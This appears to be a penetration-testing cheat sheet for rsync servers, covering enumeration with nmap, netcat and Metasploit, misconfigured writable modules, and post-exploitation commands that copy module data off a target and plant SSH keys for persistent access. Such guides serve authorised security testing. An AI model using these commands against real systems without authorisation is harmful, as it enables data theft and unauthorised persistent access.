# Rsync

**`Default Port: 873`**

### Connect <a href="#connect" id="connect"></a>

To initiate a connection with an rsync server, use the `rsync` command followed by the rsync URL.

The URL format is \`\[rsync://]\[user@]host\[:port]/module.\`\`

```
rsync rsync://user@target_host/
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Identifying an Rsync Server <a href="#identifying-an-rsync-server" id="identifying-an-rsync-server"></a>

You can use `Nmap` to check if there's an Rsync server on a target host like this:

```
nmap -p 873 X.X.X.X
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

You can use `Netcat` to find out what service is running and its version by looking at the welcome message it shows when you connect. This method is called Banner Grabbing.

```
nc -nv X.X.X.X 873

# Expected output format
@RSYNCD: version
```

#### Enumerate Modules <a href="#enumerate-modules" id="enumerate-modules"></a>

Enumeration is crucial in understanding the structure of the target rsync module and finding misconfigurations or sensitive information.

**Using nmap**

```
nmap -sV --script "rsync-list-modules" -p 873 target_host
```

**Using Metasploit**

```
msf> use auxiliary/scanner/rsync/modules_list
```

#### Enumerate Shared Folders <a href="#enumerate-shared-folders" id="enumerate-shared-folders"></a>

Rsync modules represent directory shares and may be protected with a password. To list these modules:

```
rsync target_host::
```

```
rsync -av --list-only rsync://target_host/module_name
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Misconfigured Modules <a href="#misconfigured-modules" id="misconfigured-modules"></a>

Modules without proper authentication can be accessed by unauthorized users. This vulnerability allows attackers to read, modify, or delete sensitive data.

If a module is writable, and you have determined its path through enumeration, you can upload malicious files, potentially leading to remote command execution or pivoting into the network.

#### Outdated Rsync Version <a href="#outdated-rsync-version" id="outdated-rsync-version"></a>

Old versions of rsync may contain vulnerabilities that can be exploited. Use tools like nmap with version detection to identify if the target is running an outdated rsync version.

```
nmap -sV --script=rsync-list-modules target_host
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

```
rsync -avz target_host::module_name /local/directory/
```

#### Gain Persistent Access <a href="#gain-persistent-access" id="gain-persistent-access"></a>

```
rsync -av home_user/.ssh/ rsync://user@target_host/home_user/.ssh
```
